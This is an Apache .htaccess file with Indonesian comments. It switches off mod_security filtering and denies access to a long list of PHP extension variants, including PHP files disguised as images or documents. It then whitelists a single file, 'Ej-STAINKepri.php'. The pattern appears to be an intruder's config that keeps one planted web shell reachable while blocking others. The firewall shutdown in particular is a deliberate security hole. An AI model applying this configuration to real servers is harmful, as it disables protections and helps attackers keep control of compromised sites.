# RewriteEngine On

# # Izinkan akses ke halaman maintenance
# RewriteCond %{REQUEST_URI} !^/maintenance\.html$

# # Izinkan akses ke file statis (opsional)
# RewriteCond %{REQUEST_URI} !\.(css|js|png|jpg|jpeg|gif|ico)$

# # Redirect semua request ke maintenance
# RewriteRule ^(.*)$ /maintenance.html [R=302,L]


<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
</IfModule>

<FilesMatch "\.(PhP|phP|PHP1|PHP2|PHP3|PHP4|pHP|Php|php|pHP|PHP|pHp|PHp|pHp|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phtml|php|php5|php3|php|php7|Php7|pHp7|phP7|php5|pHp56|phar|Phar|pHar|phAr|phaR|PHar|pHAr|phAR|PHar|PHAR|pHAR|PaHAR|PHaR|PHAr|pHAR|PhP|php|phtml|PhTmL|pHtML|phtmL|PHTML|php.php.php.php.php.php|php.php.phtml|PHTML.phtml|pht|Pht|pHt|phT|pHT|PHt|PHT|php11|php12|php.test|suspected|php.suspected|php10|php11|php56|php.php.php|php.phtml|php.php.php.php.php|Php|pHp|phhP|pht|PHT|php.J|PHP|PhP|php1|php2|php4|php5|PHP5|PhP5|php6|php7|php8|php9|PHTML|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|shtml|sHtml|shTml|ShtMl|shtmL|SHtml|SHTml|ShTmL|SHTML|sHtmL)">
Deny from All
</FilesMatch>

# Blokir file PHP yang disamarkan sebagai gambar atau dokumen
<FilesMatch "\.(php\.(jpg|jpeg|png|gif|pdf|txt|zip|docx?|xlsx?|pptx?)|php[0-9]*\.(jpg|jpeg|png|gif|pdf)|php\.suspected)$">
    Order allow,deny
    Deny from all
</FilesMatch>

# Izinkan file tertentu yang memang sah untuk diakses
<FilesMatch "^(Ej-STAINKepri.php)$">
    Order allow,deny
    Allow from all
</FilesMatch>

# Izinkan ekstensi .min untuk diproses sebagai PHP
